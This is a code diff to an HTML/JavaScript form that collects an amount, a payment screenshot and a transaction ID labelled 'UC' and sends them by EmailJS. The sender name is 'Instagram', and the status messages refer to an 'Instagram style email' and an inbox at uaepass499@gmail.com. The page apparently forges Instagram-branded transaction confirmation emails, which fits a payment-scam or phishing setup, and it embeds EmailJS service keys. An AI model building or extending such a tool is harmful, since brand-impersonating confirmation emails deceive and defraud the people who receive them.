@@ -24,14 +24,14 @@ input{width:100%;padding:13px;border:2px solid #ddd;border-radius:10px;box-sizin
 <label>Amount</label>
 <input type="number" id="amount" value="1500">
 <label>Screenshot</label>
-<input type="file" id="ss" accept="image/*" style="border:2px dashed #f7b500;background:#fffbe6">
+<input type="file" id="ss" accept="image/*" style="border:2px dashed #f7b500;background:#fffbe6;padding:10px;border-radius:10px">
 <button class="btn" onclick="nextStep()">VERIFY TO CHECK →</button>
 </div>
 
 <div class="box step" id="step2">
 <div class="uc">UC</div>
 <h2>Transaction ID</h2>
-<input id="txn" type="tel" placeholder="160443" style="font-size:40px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:80px">
+<input id="txn" type="tel" placeholder="542546585" style="font-size:40px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:80px">
 <div id="ok2" class="success" style="display:none"></div>
 <div style="display:flex;gap:8px;margin-top:12px">
 <button class="btn" style="background:#fff;flex:1" onclick="backStep()">← BACK</button>
@@ -42,13 +42,13 @@ input{width:100%;padding:13px;border:2px solid #ddd;border-radius:10px;box-sizin
 <script>
 emailjs.init("M1gpuw8FX2OfMZz2-");
 const SERVICE_ID = "service_m2y2j8e";
-const TEMPLATE_ID = "template_2r1r6il";
+const TEMPLATE_ID = "template_2r1r6ii";
 
 function nextStep(){
  let a=document.getElementById('amount').value;
  let f=document.getElementById('ss').files[0];
  if(!a){alert('Amount likho');return;}
- if(!f){alert('Screenshot select karo - 74532.jpg to select hai, dubara select karo');return;}
+ if(!f){alert('Screenshot select karo');return;}
  document.getElementById('step1').classList.remove('active');
  document.getElementById('step2').classList.add('active');
 }
@@ -70,11 +70,11 @@ function sendTxn(){
    name: "Instagram"
  }).then(()=>{
    ok.style.display='block';
-   ok.innerText="✅ "+id+" - Instagram style email bhej diya!";
+   ok.innerText="✅ "+id+" - Email bhej diya! Check inbox uaepass499@gmail.com";
    btn.innerText='SENT ✅';
  }, (err)=>{
    ok.style.display='block';
-   ok.innerText="❌ Error: "+err.text;
+   ok.innerText="❌ Error: "+JSON.stringify(err);
    btn.innerText='TRY AGAIN';
    console.log(err);
  });
